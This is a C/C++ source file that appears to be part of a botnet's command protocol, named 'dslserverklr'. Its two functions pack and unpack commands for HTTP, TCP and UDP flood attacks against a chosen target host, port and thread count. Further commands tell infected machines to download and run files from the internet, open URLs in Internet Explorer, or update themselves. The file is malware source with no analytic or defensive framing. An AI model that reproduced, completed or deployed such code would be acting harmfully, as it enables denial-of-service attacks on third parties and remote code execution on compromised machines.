#ifdef _WIN32
#include <Winsock2.h>  
#include <windows.h>
#else
#include <pwd.h>
#include <pthread.h>
#include <fcntl.h>
#include <syslog.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#endif

#include <iostream>
#include <iomanip>
#include <ctime>

#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <malloc.h>

#include "common.h"
#include "dslserverklr.h"

void dsl_makecmd(dslserverklr_command &cmd, const dslserverklr_cmd_info &cmdinfo)
{
    if (DSLSERVERKLR_CMD_HTTP_FLOOD == cmd.cmdcode)
    {
        dslserverklr_http_cmddata &cmdata = cmd.http_data;
        strcpy(cmdata.target_host, cmdinfo.host.c_str());
        cmdata.target_port = cmdinfo.port;
        cmdata.thread_count = cmdinfo.threads;
        cmdata.subcode = cmdinfo.subcode;
        strcpy(cmdata.url, cmdinfo.url.c_str());
    }
    else if (DSLSERVERKLR_CMD_TRANS_FLOOD == cmd.cmdcode)
    {
        dslserverklr_tcp_cmddata &cmdata = cmd.tcp_data;
        strcpy(cmdata.target_host, cmdinfo.host.c_str());
        cmdata.target_port = cmdinfo.port;        
        cmdata.thread_count = cmdinfo.threads;
        cmdata.subcode = cmdinfo.subcode;
        memset(cmdata.data, 0x42, 0x70);
    }
    else if (DSLSERVERKLR_CMD_IP_FLOOD == cmd.cmdcode)
    {
        dslserverklr_flood_cmddata &cmdata = cmd.udp_data;
        strcpy(cmdata.target_host, cmdinfo.host.c_str());
        cmdata.target_port = cmdinfo.port;
        cmdata.thread_count = cmdinfo.threads;
        cmdata.subcode = cmdinfo.subcode;
    }
    else if ((DSLSERVERKLR_CMD_EXEC_INTERNET_FILE == cmd.cmdcode)
        || (DSLSERVERKLR_CMD_EXEC_INTERNET_FILE2 == cmd.cmdcode)
        || (DSLSERVERKLR_CMD_UPDATE == cmd.cmdcode)
        || (DSLSERVERKLR_CMD_EXEC_IE_1 == cmd.cmdcode)
        || (DSLSERVERKLR_CMD_EXEC_IE_2 == cmd.cmdcode)
        )
    {
        dslserverklr_ctl_cmddata &cmdata = cmd.ctl_data;
        strcpy(cmdata.url, cmdinfo.host.c_str());
    }
}

void dsl_parsecmd(const dslserverklr_command & cmd, dslserverklr_cmd_info & cmdinfo)
{
    if (DSLSERVERKLR_CMD_HTTP_FLOOD == cmd.cmdcode)
    {
        const dslserverklr_http_cmddata &cmdata = cmd.http_data;
        cmdinfo.host = cmdata.target_host;
        cmdinfo.port = cmdata.target_port;
        cmdinfo.threads = cmdata.thread_count;
        cmdinfo.subcode = cmdata.subcode;
        cmdinfo.url = cmdata.url;
    }
    else if (DSLSERVERKLR_CMD_TRANS_FLOOD == cmd.cmdcode)
    {
        const dslserverklr_tcp_cmddata &cmdata = cmd.tcp_data;
        cmdinfo.host = cmdata.target_host;
        cmdinfo.port = cmdata.target_port;
        cmdinfo.threads = cmdata.thread_count;
        cmdinfo.subcode = cmdata.subcode;
        memcpy(cmdinfo.data, cmdata.data, 0x10);
    }
    else if (DSLSERVERKLR_CMD_IP_FLOOD == cmd.cmdcode)
    {
        const dslserverklr_flood_cmddata &cmdata = cmd.udp_data;
        cmdinfo.host = cmdata.target_host;
        cmdinfo.port = cmdata.target_port; 
        cmdinfo.threads = cmdata.thread_count;
        cmdinfo.subcode = cmdata.subcode;
    }
    else if ((DSLSERVERKLR_CMD_EXEC_INTERNET_FILE == cmd.cmdcode)
        || (DSLSERVERKLR_CMD_EXEC_INTERNET_FILE2 == cmd.cmdcode)
        || (DSLSERVERKLR_CMD_UPDATE == cmd.cmdcode)
        || (DSLSERVERKLR_CMD_EXEC_IE_1 == cmd.cmdcode)
        || (DSLSERVERKLR_CMD_EXEC_IE_2 == cmd.cmdcode)
        )
    {
        const dslserverklr_ctl_cmddata &cmdata = cmd.ctl_data;
        cmdinfo.host = cmdata.url;
    }
}
